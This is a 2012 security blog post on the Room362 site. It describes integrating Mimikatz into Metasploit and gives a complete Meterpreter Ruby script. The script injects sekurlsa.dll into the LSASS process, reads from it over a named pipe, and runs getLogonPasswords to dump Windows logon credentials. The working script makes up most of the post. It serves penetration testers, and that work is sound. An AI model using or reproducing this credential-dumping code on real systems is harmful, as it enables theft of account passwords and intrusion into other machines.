<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <title>
    Integration of Mimikatz into Metasploit Stage1 // Room362
  </title>

  <link href="http://gmpg.org/xfn/11" rel="profile">
<meta http-equiv="content-type" content="text/html; charset=utf-8">


<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="mubix">
<meta name="generator" content="Hugo 0.16" />

  <meta property="og:title" content="Integration of Mimikatz into Metasploit Stage1" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="en_US" />
<meta property="og:url" content="https://room362.com/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/" />


  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
  
  
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
  
  

  <link rel="stylesheet" href="https://room362.com//css/redlounge.css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.png">

  
  <link href="" rel="alternate" type="application/rss+xml" title="Room362" />

    
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>


  

  

  

  
</head>

<body>
	

	<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
  <div class="header">
    

	
	  <img src="/images/headshot.png" class="sidebarphoto">
	

    <h1 class="brand-title">Room362</h1>
    <h2 class="brand-tagline">Blatherings of a security addict</h2>

    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://room362.com/">Home</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/brandon/">Brandon</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li>
        
      </ul>
    </nav>

    
    <div class="social-buttons">
      
        
        <a href="/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
        
      
        
        <a href="https://linkedin.com/in/mubix" target="_blank"><i class='fa fa-linkedin'></i></a>
        
      
        
        <a href="https://twitter.com/mubix" target="_blank"><i class='fa fa-twitter'></i></a>
        
      
      
    </div>
    

  </div>
</div>

	
	

    <div class="content pure-u-1 pure-u-md-3-4">
		<a name="top"></a>
		

		
			
	    
  		<section class="post">
            <h1 class="post-title">
              <a href="/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/">Integration of Mimikatz into Metasploit Stage1</a>
            </h1>
            <h3 class="post-subtitle">
            	
            </h3>
            
            	<span class="post-date">
                	<span class="post-date-day"><sup>15</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2012</span>
            	</span>
            	
            
            	
            		<span class="post-author-single">By <a class="post-author"  target="">mubix</a></span>
            		




            	
            

			
			
				<div class="post-categories">
				
					<a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
				
					<a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
				
					<a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
				
				</div>
			

			

			

            <p>One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.</p>

<p>Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&rsquo;ll get there in the subsequent posts.</p>

<p>Ignore the do_cmd for now and I stepped through <a href="/blog/2011/5/30/remote-dll-injection-with-meterpreter.html">remote DLL injection here</a>. So the first odd lines is </p>

<pre><code class="language-ruby">handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
</code></pre>

<p>Essentially these connect to the <a href="http://en.wikipedia.org/wiki/Named_pipe">Named Pipe</a> that the sekurlsa.dll uses to talk to the mimikatz.exe in it&rsquo;s normal operation. Then we just use the windows API call &ldquo;ReadFile&rdquo; from there on out.</p>

<pre><code class="language-ruby">client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
</code></pre>

<p>One of the draw backs to doing this all remotely is that Railgun doesn&rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&rsquo;ve overcome this for the initial &ldquo;banner&rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &ldquo;ping&rdquo; and &ldquo;getLogonPasswords&rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)</p>

<p>If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!</p>

<p>Meterpreter Script:</p>

<pre><code class="language-ruby">def do_cmd(handle,cmd)
	ucommand = Rex::Text.to_unicode(cmd)
	sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
	good2go = false
	newline = false
	readstring = []
	while good2go == false
		# Have to pull data 1 unicode character at a time
		# this is because the pipe won't write or read if
		# too much was written or read by the &quot;client&quot; (us)
		pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
		# Check to see if our end of read check is there: n000 @00
		if pull['lpBuffer'] == &quot;@00&quot; and newline == true
			good2go = true
		else
			readstring &lt;&lt; pull['lpBuffer']
		end
		
		# Ready the newline var for previous check on next loop
		if pull['lpBuffer'] == &quot;n00&quot;
			newline = true
		else
			newline = false
		end
	end
	
	print_status(readstring.join(&quot;&quot;))
end

print_status(&quot;x86 Detected - Using x86 mimikatz&quot;)
handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
print_status(&quot;Handle: #{handle}&quot;)
framework.threads.spawn('injectlsass',false) {
	pid = client.sys.process['lsass.exe']
	print_status(&quot;LSASS located at PID: #{pid}&quot;)
	pathtomimi = &quot;C:\\sekurlsa.dll&quot;

	pay = client.framework.payloads.create(&quot;windows/loadlibrary&quot;)
	pay.datastore[&quot;DLL&quot;] = pathtomimi
	pay.datastore[&quot;EXITFUNC&quot;] = 'thread'

	raw = pay.generate
	targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
	mem = targetprocess.memory.allocate(raw.length + (30024))
	targetprocess.memory.write(mem, raw)
	sleep(2)
	targetprocess.thread.create(mem, 0)
	print_status(&quot;Successfully Injected into LSASS&quot;)
}
print_status(&quot;Waiting for LSASS injection to complete&quot;)
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
print_status(&quot;Mimikatz has called home, ready for command&quot;)
sleep(2)
print_status(&quot;Reading banner&quot;)
client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
print_status(&quot;Doing a quick ping to make sure things are working...&quot;)
do_cmd(handle,'ping')
print_status(&quot;If you made it this far it worked, doing getLogonPasswords&quot;)
do_cmd(handle, 'getLogonPasswords')
</code></pre>

	
			

			

			
				<div class="paging">
					<span class="paging-label">More Reading</span>
					
					<div class="paging-newer">
						<span class="dark-red">Newer</span><span class="decorative-marker">//</span>
						<a class="paging-link" href="/post/2012/2012-06-20-companies-that-give-back-with-free-tools/">Companies that give back with free tools</a>
		            </div>
		            

					
					<div class="paging-older">
						<span class="dark-red">Older</span><span class="decorative-marker">//</span>
			            <a class="paging-link" href="/post/2012/2012-05-26-sudoers-commented-includes-used-for-evil/">SUDOERS Commented Includes used for Evil</a>
		            </div>
		            
	            </div>
            
          </section>
          
          	
          
        
      <div class="footer">
	<hr class="thin" />
	<div class="pure-menu pure-menu-horizontal pure-menu-open">
		<ul class="footer-menu">
		
			<li><a href="/about">About</a></li>
		
			<li><a href="/post">Blog</a></li>
		
		</ul>
	</div>

	<p>&copy; 2016. All rights reserved.</p>
</div>
    </div>
  </div>
	

	

  
</body>
</html>
